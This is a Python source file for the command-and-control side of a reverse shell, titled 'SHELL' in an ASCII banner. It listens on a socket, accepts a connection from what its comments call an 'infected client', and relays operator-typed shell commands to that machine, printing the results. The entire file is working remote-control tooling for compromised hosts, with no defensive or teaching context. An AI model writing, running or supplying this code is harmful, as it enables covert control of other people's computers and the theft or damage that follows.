import socket
from colorama import *
import os
from _thread import *
import threading

class Shell:

    
    print(Fore.GREEN + '''
  ██████  ██░ ██ ▓█████  ██▓     ██▓    
▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
      ░   ░  ░  ░   ░  ░    ░  ░    ░  ░
                                        
''')
    print(Fore.RESET + "")
    def __init__(self):
        
        self.SERVER_HOST = "192.168.1.144"
        self.SERVER_PORT = 8881
        self.BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
        self.Clients = {}
        # separator string for sending 2 messages at the same time
        self.SEPARATOR = "<sep>"
    # create a socket object
        self.s = socket.socket()

        self.s.bind((self.SERVER_HOST, self.SERVER_PORT))
        self.s.listen(5)
        print(f"Listening as {self.SERVER_HOST}:{self.SERVER_PORT} ...")
        self.Accept_connection()

    def Accept_connection(self):
        self.client, self.address = self.s.accept()
        print(f'{self.address[0]}:{self.address[1]} ' +  Fore.GREEN + 'Connected')

        self.main()
    

    #Recieve info from infected client
    def Recieve(self):
        Inc = self.client.recv(self.BUFFER_SIZE).decode()
        return Inc



    # accept any connections attempted
    
    def main(self):
        #self.Check()
        cwd = self.Recieve()
        while True:
            try:
                # get the command from prompt
                command = input(f"{cwd} sh$> ")
                if not command.strip():
                    # empty command
                    continue
                # send the command to the client
                self.client.send(command.encode())
                if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                    self.client.close()
                     
                    
                    
                # retrieve command results
                output = self.client.recv(self.BUFFER_SIZE).decode()
                # split command output and current directory, neccesary
                results, cwd = output.split(self.SEPARATOR)
                # print output
                print(results)
            except:
                self.client.close()
                self.Accept_connection()

if __name__=='__main__':
    Server = Shell()